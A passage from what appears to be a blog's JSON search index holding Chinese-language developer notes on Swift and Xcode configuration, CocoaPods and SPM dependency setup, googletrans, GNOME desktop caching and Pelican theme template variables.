稀疏检出和浅克隆","tags":"版本控制","url":"/yq-docs-version-control-git-issuses-clone-only-folder.html","loc":"/yq-docs-version-control-git-issuses-clone-only-folder.html"},{"title":"googletrans","text":"一个谷歌提供的翻译模块, 分多个版本, 实际测试可用的版本为 4.0.0-rc1 安装: # pip install googletrans==3.1.0a0 pip install googletrans == 4 .0.0-rc1 简单的翻译实现 translator = Translator () cache = {} def translate_from_ch_to_en ( text ) -> str : if text in cache : return cache [ text ] try : translation = translator . translate ( text , src = 'zh-CN' , dest = 'en' ) # return translation.text cache [ text ] = translation . text return cache [ text ] except Exception as e : print ( \"-0-0-\" , text , e ) raise e 一些预定义 googletrans.LANGUAGES 查看支持的语言种类","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-googletrans.html","loc":"/yq-docs-rear-end-python-python-three--party-library-googletrans.html"},{"title":"gnome刷新desktop缓存","text":"此前一直以为 update-desktop-database 可以直接刷新desktop缓存,\n结果用的时候一直没有生效. 再仔细看了一下 update-desktop-database 的描述说到 构建 MIME types 的缓存数据库. 一口老血. 截止目前了解到刷新缓存的三种方式: 重启gnome 图形化界面可以按快捷键 ALT + F2 , 然后输入 restart 重启 用户重新登陆 即手动注销用户, 再重新登陆, 缺点就是注销会关闭用户前台打开程序 重启 遇事不决, 直接重启","tags":"linux","url":"/yq-os-linux-ubuntu-issues.html","loc":"/yq-os-linux-ubuntu-issues.html"},{"title":"Vscode文档相关插件.rst","text":"reStructuredText 相关资源 官网文档: https://docs.restructuredtext.net 提供了基于Sphinx的语法预览提示等支持,\n但是缺点也是只支持Sphinx. 比如如果我用pelican创建的内容,\n就只能在工程区 setting.json 配置个 { \"esbonio.server.enabled\" : false } 然后就只能用使用 docutil 预览功能. Table Formatter 表格快捷编写插件 还没搞懂咋用","tags":"文档","url":"/yq-doc-vs-plugin.html","loc":"/yq-doc-vs-plugin.html"},{"title":"Xcode是否配置证书的区别","text":"如 新版本的MacOS限制越来越严格了, 只有选择如图的开发者证书\n才能在其他机器运行.\n如果只是选择了 Run Local , 在以前操作一下还可以在其他机器跑,\n现在也不行了","tags":"后端; swift","url":"/yq-backend-swift-xode-diff-with-or-no-cert.html","loc":"/yq-backend-swift-xode-diff-with-or-no-cert.html"},{"title":"swift","text":"官网: https://www.swift.org 官网API文档: https://developer.apple.com/documentation/technologies 官网教程只有英文 一个用于在Apple设备上开发的语言 现在基本是 Object-C 后的接替了 安装 Mac上直接安装Xcode就行了, 自带Swift. 其他平台可参考: https://www.swift.org/install/ Swift内置了一个包管理, 能够更简单的导入,\n包索引查询: https://swiftpackageindex.com 一些网站 民间(NGO, Non-Governmental Organization)中文社区: https://swiftgg.team 民间Swift语法中文版(相对更新慢一点): https://gitbook.swiftgg.team/swift/ 民间Swift 基本约定译文: https://github.com/SketchK/the-swift-api-design-guidelines-in-chinese 注解 swift 坑比较多, 资料也比较少... 打算做一个快捷键的, 东西太少 找到个可以借鉴的项目: git clone https://github.com/tkgka/Switcher.git git地址: https://github.com/tkgka/Switcher 注解 国内NGO就是社会组织 访问C头文件的几种方式 备注 对于MacOS 要使App全局显示, 只有设置 Info 为 Application is agent (UIElement) ,\n比如显示在其他全屏App上. 这是用其他语言暂时无法实现的... 单独的 Swift-View 如果要作为一个弹出窗体, 需要转换为 NSWindow 对于单独的 NSWindow , 直接给 delegate 会存在问题... 有个一直未解决的问题, 本地构建的App, 重新构建后, 识别不了上个版本获取的权限, 比如辅助功能...","tags":"后端; swift","url":"/yq-backend-swift.html","loc":"/yq-backend-swift.html"},{"title":"增加依赖","text":"方案一 - Xcode: 选择菜单栏的 File > Add Package Dependency , 然后输入仓库URL 参考: https://developer.apple.com/documentation/xcode/adding-package-dependencies-to-your-app 如果没找到的话(不知道为什么我就没有这个项),\n就去项目的 General , 下拉找到 Frameworks, Libraries, and Embedded Content , 如图: 然后添加依赖即可 效果就是在根目录下增加一个 Package.resolved 文件: {\n  \"pins\" : [\n    {\n      \"identity\" : \"keyboardshortcuts\",\n      \"kind\" : \"remoteSourceControl\",\n      \"location\" : \"https://github.com/sindresorhus/KeyboardShortcuts.git\",\n      \"state\" : {\n        \"revision\" : \"c252200141e4abaecf30c14ea474dc009f56d553\",\n        \"version\" : \"1.16.1\"\n      }\n    }\n  ],\n  \"version\" : 2\n} 方案二 - 官方包(文件)管理器: 项目根创建 Package.swift 定义依赖项和版本 内容例(主要是两个 dependencies 以及 头部的版本定义): // swift-tools-version: 5.8\n// The swift-tools-version declares the minimum version of Swift required to build this package.\n\nimport PackageDescription\n\nlet package = Package(\n    name: \"CQ\",\n    dependencies: [\n        // 指定 tag\n        .package(url: \"https://github.com/sindresorhus/KeyboardShortcuts.git\", from: \"1.16.1\"),\n        // 或者指定 branch\n        // .package(url: \"https://github.com/sindresorhus/KeyboardShortcuts.git\", branch: \"main\")\n    ],\n    targets: [\n        // Targets are the basic building blocks of a package, defining a module or a test suite.\n        // Targets can depend on other targets in this package and products from dependencies.\n        .executableTarget(\n            name: \"CQ\",\n            dependencies: [\n                .product(name: \"KeyboardShortcuts\", package: \"keyboardshortcuts\")\n            ],\n            path: \"CQ\"),\n    ]\n) 定义好之后执行 swift build 即可 注解 Xcode编辑器可能会提示 PackageDescription 找不到 的报错, 忽略即可 创建发布可参考: https://www.jianshu.com/p/44560fd214d2 部分属性说明: name: 一般就是产品/项目名 dependencies: 依赖路径,\n支持多种路径类型: git 源 + 确定的版本号 git 源 + 版本区间 git 源 + Commit 号 git 源 + 分支名 本地路径 targets: 目标, 可以有多个 targets.name: name targets.dependencies: 与上面的依赖不一样,\n可以依赖上面 Package.Dependency 的东西或者依赖另一个 target。\n所以这里只需要写 Package 或者 Target 的名字字符串（Target.Dependency 这个枚举也实现了 ExpressibleByStringLiteral）。 targets.path: target 的路径，默认为 [PackageRoot]/Sources/[TargetName] targets.source: 源文件路径，默认 TargetName 文件夹下都是源代码文件，会递归搜索 targets.exclude: 需要被排除在外的文件/文件夹，这些文件不会参与编译。 targets.publicHeadersPath: C 家族库的公共头文件地址。 targets.swiftSettings: 定义一个用于特定环境（例如 Debug）的宏，需要设置的话可以去 API 上研究下 targets.linkerSettings: 用于链接一些系统库 这个我失败了不知道为什么 方案三 - Pod管理器: 类似于Java的Maven","tags":"后端; swift","url":"/yq-backend-swift-add-depy.html","loc":"/yq-backend-swift-add-depy.html"},{"title":"Apple证书类型","text":"开发的设备要在其他设备上运行,\n需要有证书 宏观来说有两种 Apple开发: 普通的带证书的本地开发, 直接使用自己账户登陆,\n证书选择开发者, 就会默认生成一个可用的证书(免费, 有效期一年), 过期了再重复即可, Apple分发: 用于在其他设备运行, 发布到Apple Store, 个人账号688/y 参考: Apple官网-证书 Apple官网-证书类型","tags":"后端; swift","url":"/yq-backend-swift-apple-cert-type.html","loc":"/yq-backend-swift-apple-cert-type.html"},{"title":"Swift异步","text":"于Python类似, 高版本也支持使用async(await)来定义(调用)异步函数: func fetchData() async -> String {\n    // 模拟异步操作，比如从网络获取数据\n    await Task.sleep(1_000_000_000) // 模拟1秒的延迟\n    return \"Data fetched successfully\"\n} 当在异步上下文中调用时, 除了直接await, 还可以: async {\n    print(\"Async code block\")\n    let result = try await someAsyncFunction()\n    print(\"Result: \\(result)\")\n} 如果要在同步上下文中调用, 可以使用 Task 或者 Task.runDetached : Task.runDetached {\n    print(\"Before calling asyncTask\")\n    await asyncTask()\n    print(\"After calling asyncTask\")\n}\n\nTask {\n    print(\"Before calling asyncTask\")\n    await asyncTask()\n    print(\"After calling asyncTask\")\n} 两者区别在于它们的任务分离性和运行方式 任务分离性： Task.runDetached: 创建一个分离的任务，该任务不会等待其完成，\n它会在后台执行，不会阻塞当前线程。\n这意味着主线程或当前上下文中的代码可以继续执行而不等待任务完成。 Task: 在当前上下文中创建一个任务，它的行为类似于一个子任务。\n如果你在一个任务中调用另一个任务，并使用 await 来等待它的完成，\n那么它会在当前任务中被等待，不会分离执行 运行方式： Task.runDetached: 会创建一个新的任务，并在后台运行，不影响当前任务的执行。\n这通常用于启动一个异步任务，而不需要等待它完成 Task: 在当前任务上下文中执行，如果使用 await 等待其完成，\n它会被等待执行完成后再继续当前任务的执行","tags":"后端; swift","url":"/yq-backend-swift-course-async.html","loc":"/yq-backend-swift-course-async.html"},{"title":"常见属性包装器","text":"@State . @StateObject @StateObject属性包装器与类似@State，只不过它适用于ObservableObject。\n一个ObservableObject始终是引用类型 (class)，并且每当其@Published属性之一发生更改时都会通知。 @Binding . @ObservedObject 以便视图可以观察外部对象的状态，并在重要内容发生变化时收到通知。 @Published 允许我们创建可观察的对象，并且在发生更改时触发视图重绘。我们经常将@Published与ObservableObject协议结合使用。 此部分可参考: https://juejin.cn/post/7319706549915156499","tags":"后端; swift","url":"/yq-backend-swift-course-attribute-wrapper.html","loc":"/yq-backend-swift-course-attribute-wrapper.html"},{"title":"DEBUG条件","text":"用于设置如果是开发(DEBUG)中该做什么,\n正式环境该做什么, 如: #if DEBUG\n  print(\"可能没有获取到辅助权限, 确认后请清理后手动获取\")\n#else\n  // 打开请求辅助权限窗口\n  let _ = NoAccessView().openInWindow(title: \"请求授权\", sender: self)\n#endif 如何配置? 打开, 程序配置页面, 选择 Build Settings , 然后可以在 Filter 中\n搜索 Custom Flags 如图所示, 还需在 Other Swift Flags 中\n设置 Debug 添加 -D DEBUG , 注意不要和Release一起添加","tags":"后端; swift","url":"/yq-backend-swift-course-debug.html","loc":"/yq-backend-swift-course-debug.html"},{"title":"事件类型","text":"HID 事件和会话事件 HID 事件（Human Interface Device Events） HID 事件是指由人机交互设备（如键盘、鼠标、触摸板等）产生的事件。 用途：通过截取 HID 事件，你可以监视和响应用户与输入设备的交互，例如按键、点击、滚动等操作。 会话事件（Session Events）： 会话事件是指与用户登录会话（session）相关的事件，如用户登录、注销、屏幕锁定等。 用途：会话事件主要用于监视和响应用户登录和注销等会话级别的操作，以便执行与会话状态相关的任务或逻辑。 区别： HID 事件是与人机交互设备（输入设备）相关的事件，而会话事件是与用户登录会话（session）相关的事件。 HID 事件是针对用户输入的响应，而会话事件是针对用户登录和注销等会话级别的操作的响应。 HID 事件可以截取和处理，以实现自定义的交互逻辑，而会话事件通常由系统或框架处理。","tags":"后端; swift","url":"/yq-backend-swift-course-event-type.html","loc":"/yq-backend-swift-course-event-type.html"},{"title":"桥接导入C","text":"注解 源于AI, 有空整理 如果你在 Swift 中使用桥接头文件来访问 C 头文件中的宏定义，你可以按照以下步骤进行操作： 创建桥接头文件 在 Xcode 中，创建一个新的头文件（例如 YourProject-Bridging-Header.h）。\n在桥接头文件中，使用 #import 或 #include 导入 libproc.h 头文件: #import <libproc.h> 配置桥接头文件： 在 Xcode 项目的 \"Build Settings\"（构建设置）中，\n找到 \"Objective-C Bridging Header\"（Objective-C 桥接头文件）设置。\n将设置的值指定为桥接头文件的路径，例如 YourProject/YourProject-Bridging-Header.h。 在 Swift 代码中使用宏定义 在 Swift 文件中，你可以通过桥接头文件来访问 libproc.h 中的宏定义。\n使用 #if 预处理指令来检查宏定义的值，并在代码中做出相应的处理: #if YOUR_MACRO\n    // 宏定义存在时的处理逻辑\n#else\n    // 宏定义不存在时的处理逻辑\n#endif 请注意，Swift 是一种不同于 C 的语言，因此在 Swift 文件中无法直接访问 C 头文件中的宏定义。\n通过桥接头文件，你可以在 Objective-C 和 Swift 之间建立连接，从而使 Swift 代码能够访问 C 头文件中的宏定义和其他内容。 确保在桥接头文件和 Swift 文件之间设置了正确的路径和配置，以便能够成功访问 libproc.h 中的宏定义","tags":"后端; swift","url":"/yq-backend-swift-course-import-c.html","loc":"/yq-backend-swift-course-import-c.html"},{"title":"使用modulemap导入C++框架","text":"自己使用modulemap只导入某一个头文件,\n文件是位于SDK库的 libproc.h , 奈何一直失败, 故放弃.... 贴一些相关的资料: Importing Headers from a C++ Package Target Mixing Languages in an Xcode project Importing C++ into Swift 反正是看了一圈, 好像没直接支持的,\n如果要拿出来弄成target或者框架啥的, 就好麻烦,\n毕竟只需要导那一个...,\n暂时先桥接处理吧 使用modulemap 大致两步流程 编写 modulemap 文件, 命名为 module.modulemap (在xcode新建会自带后缀) 在 TARGETS 下配置 Swift Compiler - Search Paths 为modulemap文件所在目录 详细说明 modulemap 不止可以使用在 C++, 也可以是C, 也不止是包和框架,\n还可以直接在当前项目内直接新拉一个组用,\n但是最重要的一点, 文件名只能定义为 `module` 另外需配置 Swift Compiler - Search Paths 为modulemap文件所在目录,\n以根目录下 Modules/module.modulemap 为例 (且一定要选 TARGETS 而不是 PROJECT ): $(SRCROOT)/Modules 重要 modulemap文件名只能叫 module module.modulemap内容示例: module ProcInfo {\n    header \"tt.h\"\n    export *\n} 其他说明 有个新的问题, 就是在自定义的头文件, 无法导入其他头文件并正常使用,\n以导入SDK库的libproc为例: // tt.h\n#ifndef tt_h\n#define tt_h\n\n//#include <libproc.h>\n//#import <libproc.h>\n#import </Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX14.2.sdk/usr/include/libproc.h>\n\n// 不知道为啥, 就是找不到sdk包里面的 libproc...\n\n#define NAME \"YQ\"\n#define NAME2 \"YQ\"\n#define PROC_PIDPATHINFO_MAXSIZE PROC_PIDPATHINFO_MAXSIZE\n#define PROC_Q_MAXSIZE PROC_PIDPATHINFO_MAXSIZE\n#define SIZEYQ \"PROC_PIDPATHINFO_MAXSIZE\"\n\n#endif /* tt_h */ 不管 import 怎么写, 不管在 header path怎么设置, 哪怕是直接导入绝对路径, cmd + click 都找不到... 最后尝试了一下在swift中使用, 发现一个问题,\n就是虽然头文件中没发直接按住Command键并单击来导航到导入的头文件,\n但是代码中可以拿到部分值 注解 无法通过 按住Command键并单击来 自定义头文件中引入的头文件来确定是否成功导入,\n貌似根本没发在项目支持.","tags":"后端; swift","url":"/yq-backend-swift-course-import-cframe.html","loc":"/yq-backend-swift-course-import-cframe.html"},{"title":"swift3.x升级到5.x","text":"先去 App Store 下载 Swiftify for Xcode : https://apps.apple.com/cn/app/swiftify-for-xcode/id1183412116?mt=12 先注册: https://swiftify.com/profile/api-key/ 主要是要获取一个API KEY 配置: 系统偏好设置 => \"扩展\"中为Xcode Source Editor(Xcode源码编辑器)选择\"Swiftyfy for Xcode\" 打开Xcode => Editor => 菜单下看到新的\"Swiftify\"子菜单 好吧不行, 坑, 这是 object-c => swift 的","tags":"后端; swift","url":"/yq-backend-swift-issuse-update.html","loc":"/yq-backend-swift-issuse-update.html"},{"title":"包管理工具pod(cocoapods)","text":"参考: https://juejin.cn/post/6932739864613879821 类似于Java的Maven 需要先有Ruby, 因为pod是用Ruby写的, 安装: gem install cocoapods\npod setup 配置镜像 参考: https://mirrors.tuna.tsinghua.edu.cn/help/CocoaPods/ 内容: CocoaPods 是一个 Cocoa 和 Cocoa Touch 框架的依赖管理器，具体原理和 Homebrew 有点类似，都是从 GitHub 下载索引，然后根据索引下载依赖的源代码。\n\n对于旧版的 CocoaPods 可以使用如下方法使用 tuna 的镜像：\n\n$ pod repo remove master\n$ pod repo add master https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git\n\n# 把所有上传到cocoapods的第三方框架下载每个版本和网络地址以及一些其他描述信息到本地\n$ pod repo update\n\n新版的 CocoaPods 不允许用pod repo add直接添加master库了，但是依然可以：\n\n$ cd ~/.cocoapods/repos\n$ pod repo remove master\n$ git clone https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git master\n最后进入自己的工程，在自己工程的podFile第一行加上：\n\nsource 'https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git' 克隆镜像有点慢, 我这花了9分半 Mac默认缓存位置是在: /Users/用户名/.cocoapods/repos 应该是pod转了一遍网络的原因, 导致github没有走clash的代理,\n全局代理也无效; 只能手动配置一下了: git config --global http.https://github.com.proxy socks5://127.0.0.1:60742 还没试, 后面试试. 附, 恢复: git config --global --unset http.proxy 复制代码\n\ngit config --global --unset http.https://github.com.proxy 复制代码 使用 命令行方式: pod init 或者手动创建 Podfile : source 'https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git'\n\nplatform :osx, '14.0'\nuse_frameworks!\n\ntarget 'CQ' do\n    pod 'KeyboardShortcuts', '~> 1.16.1'\nend 第一行指定源 后续安装直接: pod install 即可 注解 这里用的 KeyboardShortcuts 发现pod上面版本只有 0.7.1 , 太低了, 放弃 重要 使用pod的项目, 一定要使用 项目名.xcworkspace 打开, 才是 pod 的配置,\n否则找不到pod安装的模块","tags":"后端; swift","url":"/yq-backend-swift-pod.html","loc":"/yq-backend-swift-pod.html"},{"title":"使用SPM(Swift Package Manager)","text":"Swift Package Manager (SPM) 注解 源于AI, 有空整理 如果你想在 Swift Package Manager (SPM) 中导入 C 代码，你可以按照以下步骤进行操作： 创建 Swift 包 在你的项目目录中，打开终端或命令提示符。\n使用 cd 命令导航到你的项目目录。\n运行以下命令创建一个新的 Swift 包: swift package init 或者直接在xcode创建 配置 Swift 包 在项目目录中，使用文本编辑器打开 Package.swift 文件。\n在 Package.swift 文件中，配置 Swift 包的名称、目标和依赖项等信息。\n在 targets 数组中，定义你的目标及其相关设置，例如模块名称、源文件路径等。 在 Swift 包中创建 C 源文件 在你的 Swift 包目录中，创建一个包含 C 代码的源文件，例如 YourPackage/Sources/YourPackage/CFile.c。\n在 C 源文件中，编写你的 C 代码。 更新 Swift 包配置文件 在 Package.swift 文件中，将 C 源文件添加到 Swift 包的目标中。\n修改 targets 数组中的目标配置，添加 C 源文件的路径: // Package.swift\n\n// ...\n\ntargets: [\n    .target(\n        name: \"YourPackage\",\n        dependencies: [],\n        cSettings: [\n            .headerSearchPath(\"YourPackage/Sources/YourPackage\"),\n            .unsafeFlags([\"-Xclang\", \"-fmodule-map-file=YourPackage/Sources/YourPackage/module.modulemap\"]),\n        ]\n    ),\n    // ...\n], 创建模块映射文件 在 Swift 包目录中，创建一个名为 module.modulemap 的模块映射文件，\n例如 YourPackage/Sources/YourPackage/module.modulemap。\n在模块映射文件中，指定你的 C 源文件的导入方式: // module.modulemap\n\nmodule YourPackage [system] {\n    header \"CFile.h\"\n    export *\n} 导入 C 代码 在你的 Swift 代码中，使用 import 语句导入你的 Swift 包。\n现在你可以在 Swift 代码中使用导入的模块和其中的 C 代码: // Swift 代码\n\nimport YourPackage\n\n// 使用导入的模块和其中的 C 代码 通过以上步骤，你可以使用 Swift Package Manager 导入和使用 C 代码。\n确保在 Swift 包的配置文件中正确指定了 C 源文件的路径，并使用模块映射文件来定义导入方式。 请注意，使用 Swift Package Manager 导入 C 代码需要适当的配置和目录结构，\n并且需要在模块映射文件中正确定义 C 源文件的导入方式。\n确保你的 C 代码可以正确编译和链接，并在 Swift 代码中按照适当的方式使用。","tags":"后端; swift","url":"/yq-backend-swift-spm.html","loc":"/yq-backend-swift-spm.html"},{"title":"一些好用三方库","text":"KeyboardShortcuts 键盘事件处理库: https://swiftpackageindex.com/sindresorhus/KeyboardShortcuts 支持全局快捷键的监听, 完美支持MacOS的沙盒","tags":"后端; swift","url":"/yq-backend-swift-three-lib.html","loc":"/yq-backend-swift-three-lib.html"},{"title":"Xcode删除掉强制证书","text":"Xcode删除掉强制证书/删除掉强制团队验证 先关闭掉xcode项目, 然后用文本编辑器比如vscode打开\n项目配置文件 xxx.xcodeproj , 全局搜索并更新为以下字段: # 这个这样改\nCODE_SIGN_STYLE = Manual;\n\n# 这些直接删除也可\nCODE_SIGN_IDENTITY = \"\"\nDEVELOPMENT_TEAM = \"\"\nPROVISIONING_PROFILE_SPECIFIER = \"\"; 原来的内容也贴一下做个参考: CODE_SIGN_STYLE = Automatic;\n# 最主要就是这个和TEAM\nCODE_SIGN_IDENTITY = \"Apple Development\";\nDEVELOPMENT_TEAM = \"\";\nPROVISIONING_PROFILE_SPECIFIER = \"\"; 注解 不要在xcode项目打开的时候改, 不然会修改失败(多半会被内存中的覆盖掉) 重新打开xcode, 在 Target 中看看对不对, 不对就按这样选择 以及在 build setting 中的 Signing 设置下 注解 顺便吐槽一句, xcode 太难用","tags":"后端; swift","url":"/yq-backend-swift-xode-conf-del-cert.html","loc":"/yq-backend-swift-xode-conf-del-cert.html"},{"title":"Xcode的Info配置","text":"配置位置 这里配置时, 会自动新建一个info.plist文件.\n若这里没有相应的选项, 那么可点击任意条目的 + 进行新增,\n如图: 下面介绍常见条目作用 Application is agent (UIElement): boolean 用来将应用程序设置为代理（agent）应用程序。\n应用程序将以无窗口的形式运行，并且不会在 Dock 中显示应用程序图标。 通常用于实现后台任务、系统级别的服务或菜单栏应用程序等。\n代理应用程序在后台运行，不会干扰用户的工作流程，但仍然可以提供某些功能或服务。 隐藏应用程序图标：设置应用程序为代理应用程序后，应用程序的图标将不会显示在 Dock 中，从而不会占用 Dock 的空间 无窗口运行：代理应用程序通常不需要显示窗口，因此它们以无窗口的形式运行，不会在屏幕上显示用户界面。 后台任务：代理应用程序可以在后台执行任务，例如监控系统事件、定时任务、网络请求等。 系统级别的服务：代理应用程序可以提供系统级别的服务，例如全局快捷键监听、剪贴板操作、菜单栏扩展等。 额外作用: 窗口默认支持 显示在其他全屏应用上方 (可能是因为属于系统级)","tags":"后端; swift","url":"/yq-backend-swift-xode-conf-info.html","loc":"/yq-backend-swift-xode-conf-info.html"},{"title":"xcode15新功能","text":"预览宏-Preview 新版本如果要预览 swiftUI, 直接: #Preview {\n    ContentView()\n} 即可 参考: https://juejin.cn/post/7244109491897401381","tags":"后端; swift","url":"/yq-backend-swift-xode-new-f.html","loc":"/yq-backend-swift-xode-new-f.html"},{"title":"Xcode-分发打包","text":"Xcode版本: 15.1(15C65) 当前版本 在此位置编辑Schema 或者在 Product - Schema 编辑Schema Product - Archive 进行打包 打包位置 然后会进入 Archive 界面, 选择 Distribute App 注意, Archive 界面也可以通过 Window - Organizer 进入: 没购买官方开发者账号的就选 Custom 来导出副本到本地 正规App开发者账号上传后续可以参考: https://zhuanlan.zhihu.com/p/583812511","tags":"后端; swift","url":"/yq-backend-swift-xode-pack-dist.html","loc":"/yq-backend-swift-xode-pack-dist.html"},{"title":"主题模版与变量","text":"主要参考: https://pelican-docs-latest-cn.readthedocs.io/zh-cn/latest/themes.html 主题框架 必须遵循以下的文件结构: ├── static\n│   ├── css\n│   └── images\n└── templates\n    ├── archives.html         // 显示存档\n    ├── period_archives.html  // 显示时间段存档\n    ├── article.html          // 应用于每篇文章\n    ├── author.html           // 应用于每个作者\n    ├── authors.html          // 应用于所有作者\n    ├── categories.html       // 列出所有分类\n    ├── category.html         // 应用于每个分类\n    ├── index.html            // 索引 (列出所有文章)\n    ├── page.html             // 应用于每个page页\n    ├── tag.html              // 应用于每个标签\n    └── tags.html             // 列出所有标签，可以是标签云 其中, static 包含所有静态资源，这些静态资源将被复制到输出目录的 theme 文件夹。\n上述文件系统布局中包括CSS文件夹和图像文件夹，但这些只是示例。把你需要的放在这个目录下。 templates 包含将用于生成内容的所有模板。上面列出的模板文件是强制性的； 创建主题时如果有需要，你可以添加自己的模板文件。 模板和变量 自定义全局模版变量 只要设置文件中定义的变量拼写全大写，所有模板都将接收它们。 预定义全局模版变量 所有这些设置将适用于所有模板。 变量 描述 output_file 当前正在生成的文件的名称。例如，当pelican渲染主页，输 出文件output_file将为 \"index.html\" 。 articles 文章列表，按日期降序排序。 所有元素都是 Article 文章 对象，因此你可以访问它们的属性（例如标题、摘要、作者 等）。有时这些信息被隐去（比如在标签页）。不过你可以在 所有文章 all_articles 变量中找到有关的信息。 dates 同样是文章列表，不过按日期升序排序。 drafts 文章草稿列表。 authors 一个元组tuples（作者，文章）列表，包含所有作者和相应的文章（值）。 categories 一个元组tuples（分类，文章）列表，包含所有分类和相应的文章（值 ）。 tags 一个元组tuples（标签，文章）列表，包含所有标签和相应的文章（值 ）。 pages pages页面列表 hidden_pages 隐藏的pages页面列表 draft_pages pages页面草稿列表 排序 URL包装器（当前为分类、标签和作者），内含比较方法，可以很方便地按名称排序 {% for tag , articles in tags | sort %} 相关jinja命令可参考 https://jinja.palletsprojects.com/templates/#sort 格式化日期 可以直接设置 DATE_FORMATS/DEFAULT_DATE_FORMAT 以及 locale_date 属性以供你对日期进行格式化设置 可以此格式在模版中灵活使用 {{ article.date | strftime ( '%d %B %Y' ) }} 模板页index.html 用于生成博客主页或索引页 index.html 如果分页功能处于启用状态，则后续的页面将类似 index{number}.html 这种形式。 变量 描述 articles_paginator 文章列表的分页对象 articles_page 文章的当前页码 articles_previous_page 文章的前一页(如果页面不存在，则为\"无\") articles_next_page 文章的下一页(如果页面不存在，则为\"无\") dates_paginator 文章列表的分页对象，按日期升序排序 dates_page 文章的当前页，按日期升序排序。 dates_previous_page 文章的前一页，按日期升序排序(如果页面不存在，则为\"无\") dates_next_page 文章的下一页，按日期升序排序(如果页面不存在，则为\"无\") page_name ‘index' – 用于分页链接 模板页author.html 此模板将应用于每个作者，根据 AUTHOR_SAVE_AS 设置 (默认值: author/{slug}.html) 生成输出。 如果分页功能处于启用状态，则后续的页面默认类似为 author/{slug}{number}.html 这种形式。 变量 描述 author 作者姓名 articles 作者的文章 dates 作者的文章，按日期升序排序 articles_paginator 文章列表的分页对象 articles_page 文章的当前页面 articles_previous_page 文章的前一页(如果页面不存在，则为\"无\") articles_next_page 文章的下一页(如果页面不存在，则为\"无\") dates_paginator 文章列表的分页对象，按日期升序排序 dates_page 文章的当前页，按日期升序排序。 dates_previous_page 文章的前一页，按日期升序排序(如果页面不存在，则为\"无\") dates_next_page 文章的下一页，按日期升序排序(如果页面不存在，则为\"无\") page_name AUTHOR_URL 其中 {slug} 之后的所有内容都被删除 - 对于分页链接有用 模板页category.html 此模板将应用于每个现有类别，根据 CATEGORY_SAVE_AS 设置 (默认值: category/{slug}.html) 生成输出。 如果分页功能处于启用状态，则后续的页面默认类似为 category/{slug}{number}.html 这种形式。 变量 描述 category 分类名 articles 分类文章 dates 分类的文章，按日期升序排序 articles_paginator 文章列表的分页对象 articles_page 文章的当前页面 articles_previous_page 文章的前一页(如果页面不存在，则为\"无\") articles_next_page 文章的下一页(如果页面不存在，则为\"无\") dates_paginator 文章列表的分页对象，按日期升序排序 dates_page 文章的当前页，按日期升序排序。 dates_previous_page 文章的前一页，按日期升序排序(如果页面不存在，则为\"无\") dates_next_page 文章的下一页，按日期升序排序(如果页面不存在，则为\"无\") page_name CATEGORY_URL，其中 {slug} 之后的所有内容都被删除 - 对于分页链接有用 模板页article.html 此模板将应用于每篇文章, 根据 ARTICLE_SAVE_AS 设置 (默认值: {slug}.html) 生成输出。\n可以使用以下变量。 变量 描述 article 显示的文章 category 当前文章的分类名称 在文章源文件头部区域添加的任何元数据都将被视为 article 对象的字段。\n字段名称将与元数据所用的名称相同，不过是采用 小写字母形式 。 例如，你可以在文章元数据中添加一个 FacebookImage 的字段，如下所示: Title: I love Python more than music\nDate: 2013-11-06 10:06\nTags: personal, python\nCategory: Tech\nSlug: python-je-l-aime-a-mourir\nAuthor: Francis Cabrel\nFacebookImage: http://franciscabrel.com/images/pythonlove.png 这个新的元数据将作为 article.facebookimage 在 article.html 模板中提供调用。\n例如,这允许你为Facebook的公开图形标签指定一张图片，该图片随每篇文章而不同 <meta property=\"og:image\" content=\" {{ article.facebookimage }} \"/> 模板页page.html 此模板将应用于每个page页面，\n根据 PAGE_SAVE_AS 设置 (默认值: pages/{slug}.html) 生成输出。 可以使用以下变量。 变量 描述 page 显示的页面对象。你可以访问其标题、slug和内容。 模板页tag.html 此模板将应用于每个标签tag，根据 TAG_SAVE_AS 设置 (默认值: tag/{slug}.html) 生成输出。 如果分页功能处于启用状态，则后续的页面默认类似为 tag/{slug}{number}.html 这种形式。 变量 描述 tag 标签名称 articles 与此标签相关的文章 dates 与此标签相关的文章，按日期升序排序 articles_paginator 文章列表的分页对象 articles_page 文章的当前页面 articles_previous_page 文章的前一页(如果页面不存在，则为\"无\") articles_next_page 文章的下一页(如果页面不存在，则为\"无\") dates_paginator 文章列表的分页对象，按日期升序排序 dates_page 文章的当前页，按日期升序排序。 dates_previous_page 文章的前一页，按日期升序排序(如果页面不存在，则为\"无\") dates_next_page 文章的下一页，按日期升序排序(如果页面不存在，则为\"无\") page_name TAG_URL 其中 {slug} 之后的所有内容都被删除 模板页period_archives.html 这个模板页面，如果定义了 YEAR_ARCHIVE_SAVE_AS 的路径，则按年份处理输出文章，\n如果定义了 MONTH_ARCHIVE_SAVE_AS ，则按月份，定义 DAY_ARCHIVE_SAVE_AS 按天数。 变量 描述 period 一个元组tuple(年 月 日)，表示当前时间段。 年 和 日 格式是数字，而 月 是字符串。 当时间段给定只有年份时，此元组也才只包含 年 。 如果时间段给定有年和月等，元组将包含 年 和 月 。 对象 详细说明模板中可用且有用的对象属性。这里并没有列出所有的属性，这里选择性地列出模板中通常会用到的属性。 文章 这里'文章'的表述基于 source_path 属性的字符串值。 属性 描述 author 文章的 作者 authors 文章的 作者 列表 category 文章的 分类 content 文章渲染内容 date 表示文章日期的日期时间对象 date_format 默认日期格式或区域设置日期格式 default_template 默认模板名称 in_default_lang 表示文章是否采用默认语言编写的布尔值 lang 文章所用语言 locale_date 按 date_format 格式化的日期 metadata 文章头部元数据 dict save_as 保存文章页的位置 slug 页面的slug内容 source_path 文章源文件的完整系统路径 relative_source_path 基于 PATH 的文章源文件的相对路径 status 文章状态，可以是'已发布'或'草稿' summary 展示的摘要内容 tags 标签 对象列表 template 使用的模板名称 title 文章标题 translations 翻译 文章 对象列表 url 文章页的URL 作者 / 分类 / 标签 这里三个对象的表述基于 name 属性的字符串值。 变量 描述 name 对象的名称 [1] page_name 作者页面名称 save_as 保存作者页面的位置 slug 页面的slug内容 url 作者页的URL [1] 对于 Author 对象, 来自 :authors: or AUTHOR. 页面Page 这里'页面page'的表述基于 